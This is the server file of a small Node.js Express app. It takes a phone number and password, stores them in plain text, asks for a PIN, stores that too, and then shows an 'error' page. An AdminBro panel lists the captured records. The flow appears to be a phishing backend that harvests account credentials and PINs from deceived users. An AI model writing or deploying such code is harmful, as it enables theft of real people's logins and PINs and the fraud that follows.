const express = require('express');
const path = require('path')
const AdminBro = require('admin-bro');
const mongooseAdminBro = require('@admin-bro/mongoose');
const expressAdminBro = require('@admin-bro/express')

const app = express();

app.use(express.json());
app.use(express.urlencoded({
  extended: false
}));

app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');

//Database
const connectDB = require('./config/db');
connectDB();

//AdminBro and Models
const Customer = require('./models/Customer');
const Pin = require('./models/Pin')
const Admin = require('./models/Admin');

AdminBro.registerAdapter(mongooseAdminBro)
const AdminBroOptions = {
    resources: [Admin, Customer, Pin],
}

const adminBro = new AdminBro(AdminBroOptions)
const router = expressAdminBro.buildRouter(adminBro)

app.use(adminBro.options.rootPath, router)

app.get('/', (req, res) => {
    res.render('pages/index')
})

app.get('/pin', (req, res) => {
    res.render('pages/pin')
})

app.get('/error', (req, res) => {
    res.render('pages/error')
})

app.post('/Customer', (req, res) => {
    const connectToMongoDB = async () => {
        await connectDB().then(async () => {
            try {
                const customer = {
                    phoneNumber: req.body.phoneNumber,
                    password: req.body.password,
                }
    
                await new Customer(customer).save();
                res.redirect('pages/pin')
            }finally {
                console.log('message')
            }
        });
    }

    connectToMongoDB();
})

app.post('/Pin', (req, res) => {
    const connectToMongoDB = async () => {
        await connectDB().then(async () => {
            try {
                const pin = {
                    number: req.body.number,
                }
    
                await new Pin(pin).save();
                res.redirect('pages/error')
            }finally {
                console.log('message')
            }
        });
    }

    connectToMongoDB();
})

const PORT = process.env.port || 3000;
app.listen(PORT, () => {
    console.log(`Listening to Port ${PORT}`)
});

